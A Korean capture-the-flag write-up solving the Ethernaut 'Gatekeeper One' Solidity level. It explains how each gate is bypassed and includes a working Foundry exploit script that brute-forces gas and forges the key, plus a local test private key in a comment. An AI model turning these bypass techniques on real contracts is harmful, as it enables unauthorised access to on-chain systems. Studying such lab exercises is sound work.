# 지문

문지기를 넘어 참가자로 등록하면 이 레벨을 통과할 수 있습니다.

도움이 될 만한 것들:

Telephone과 Token 레벨에서 배운 내용을 떠올리세요.

Solidity 문서에서 특수 함수 gasleft()를 더 자세히 볼 수 있습니다(Units and Global Variables, External Function Calls 항목 참고).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

# 풀이 

`gateOne` modifier의 조건은 직관적임. `msg.sender!=tx.origin` 이니까 EOA에서 바로 문제 Contract 호출이 아니라 Contract를 하나 생성해서 그 Contract를 통해서 문제 Contract 호출을 하면됨.

`gateTwo` modifier의 조건은 저 modifier가 실행되는 시점의 남은 가스양이 8191의 배수여야함. 이건 그냥 브루트 포싱으로 충분히 가능한일 

`gateThree` modifier의 코드를 뜯어보면 충족시켜야하는 조건이 총 3가지임

1. 4바이트로 자른값과 2바이트로 자른값이 같아야함.
2. 8바이트로 봤을 때 4바이트로 자른값과 달라야함.
3. 8바이트중에 마지막 2바이트는 `tx.origin`의 주소 마지막 2바이트와 일치해야됨.



```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

contract Helper {
    function _makeKey(address origin_) internal pure returns (bytes8) {
        uint64 key64 = (uint64(1) << 32) | uint64(uint16(uint160(origin_)));
        return bytes8(key64);
    }


    function trigger(address target, address tx_origin) public {
        console.log("my answer");
        console.logBytes8(_makeKey(tx_origin));

        bytes8 _gateKey = _makeKey(tx_origin);
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

        bool res;
        for(uint i=0;i<10000000000000000;i++) {
            (res, ) = target.call{gas:(8191*10) + i}(abi.encodeWithSelector(ITarget.enter.selector, _gateKey));
            if(res==true)
                break;
        }
        console.log("End!");
    }

}
contract SolveScript is Script {
    address public target = 0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        address myAddr = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;
        Helper helper = new Helper();
        helper.trigger(target, myAddr);
        console.log("entrant address : %s", ITarget(target).entrant());
        vm.stopBroadcast();
    }
}
```